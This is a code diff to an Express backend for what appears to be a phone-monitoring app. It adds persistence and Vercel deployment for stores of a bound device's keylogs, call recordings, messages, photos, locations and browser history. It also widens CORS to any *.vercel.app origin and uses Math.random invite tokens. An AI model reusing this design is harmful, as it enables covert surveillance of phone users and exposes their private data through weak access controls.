@@ -18,6 +18,7 @@ import {
   getRemoteControlForDevice,
   defaultRemoteControlState
 } from "./deviceHelpers.js";
+import { loadPersistedState, savePersistedState } from "./stateStore.js";
 
 dotenv.config();
 
@@ -163,16 +164,65 @@ function createInviteToken() {
   return Math.random().toString(36).slice(2, 12);
 }
 
-function buildInviteUrl(token) {
+function getAppBaseUrl() {
+  if (process.env.APP_BASE_URL) {
+    return process.env.APP_BASE_URL.replace(/\/+$/, "");
+  }
+  if (process.env.VERCEL_URL) {
+    return `https://${process.env.VERCEL_URL}`;
+  }
   const localIp = getLocalIp();
-  const appBaseUrl = process.env.APP_BASE_URL || `http://${localIp}:${port}`;
-  return `${appBaseUrl}/bind/${token}`;
+  return `http://${localIp}:${port}`;
+}
+
+function buildInviteUrl(token) {
+  return `${getAppBaseUrl()}/bind/${token}`;
+}
+
+const stateStores = () => ({
+  deviceInvites,
+  boundDevices,
+  remoteControlByDevice,
+  geofenceStateByDevice,
+  geofences,
+  trackedKeywords,
+  realLocations,
+  realCallLogs,
+  realMessages,
+  realSocialChats,
+  realContacts,
+  realUsageStats,
+  realInstalledApps,
+  realNotifications,
+  realBrowserHistory,
+  realWifiLogs,
+  realSafetyAlerts,
+  realPhotos,
+  realKeylogs,
+  realAppCalls,
+  realCalendarEvents,
+  realGeofenceEvents,
+  realKeywordAlerts,
+  realCallRecordings
+});
+
+function persistState() {
+  savePersistedState(stateStores());
 }
 
 app.use(
   cors({
     origin: (origin, callback) => {
-      if (!origin || corsOrigins.includes(origin) || origin.includes("localhost") || origin.includes("127.0.0.1") || origin.startsWith("http://192.168.") || origin.startsWith("http://10.") || origin.startsWith("http://172.")) {
+      if (
+        !origin ||
+        corsOrigins.includes(origin) ||
+        origin.includes("localhost") ||
+        origin.includes("127.0.0.1") ||
+        origin.endsWith(".vercel.app") ||
+        origin.startsWith("http://192.168.") ||
+        origin.startsWith("http://10.") ||
+        origin.startsWith("http://172.")
+      ) {
         callback(null, true);
         return;
       }
@@ -180,6 +230,17 @@ app.use(
     }
   })
 );
+
+loadPersistedState(stateStores());
+
+if (process.env.VERCEL) {
+  app.use((req, res, next) => {
+    loadPersistedState(stateStores());
+    res.on("finish", () => persistState());
+    next();
+  });
+}
+
 app.use(express.json({ limit: "50mb" })); // allow screenshot base64 uploads
 
 app.get("/health", (_req, res) => {
@@ -782,6 +843,7 @@ app.post("/api/device-invitations", (req, res) => {
     redeemed: false
   };
   deviceInvites.set(token, invitation);
+  persistState();
   res.status(201).json({
     ...invitation,
     inviteUrl: buildInviteUrl(token)
@@ -803,6 +865,7 @@ app.post("/api/device-media-invitations", (req, res) => {
     redeemed: false
   };
   deviceInvites.set(token, invitation);
+  persistState();
   res.status(201).json({
     ...invitation,
     inviteUrl: buildInviteUrl(token)
@@ -839,6 +902,7 @@ app.post("/api/device-invitations/:token/redeem", (req, res) => {
   boundDevices.push(boundDevice);
   remoteControlByDevice.set(token, defaultRemoteControlState());
   geofenceStateByDevice[token] = {};
+  persistState();
   res.json({ success: true, device: boundDevice });
 });
 
@@ -858,10 +922,13 @@ app.delete("/api/devices/:id", (req, res) => {
     geofenceStateByDevice
   );
   console.log(`Device ${id} removed; cleared ${removed} telemetry records.`);
+  persistState();
   res.json({ success: true, removed });
 });
 
-app.use(express.static(distPath));
+if (!process.env.VERCEL) {
+  app.use(express.static(distPath));
+}
 app.use((req, res, next) => {
   if (req.path.startsWith("/api/") || req.path === "/health") {
     next();
@@ -885,12 +952,16 @@ app.use((err, _req, res, _next) => {
   res.status(500).json({ error: message });
 });
 
-const httpServer = app.listen(port, () => {
-  const mode = process.env.NODE_ENV || "development";
-  const staticStatus = fs.existsSync(distPath) ? "enabled" : "missing dist/";
-  console.log(`Backend server running at http://localhost:${port} (${mode}, static: ${staticStatus})`);
-});
+export { app };
 
-httpServer.on("close", () => {
-  console.log("Backend server closed");
-});
+if (!process.env.VERCEL) {
+  const httpServer = app.listen(port, () => {
+    const mode = process.env.NODE_ENV || "development";
+    const staticStatus = fs.existsSync(distPath) ? "enabled" : "missing dist/";
+    console.log(`Backend server running at http://localhost:${port} (${mode}, static: ${staticStatus})`);
+  });
+
+  httpServer.on("close", () => {
+    console.log("Backend server closed");
+  });
+}
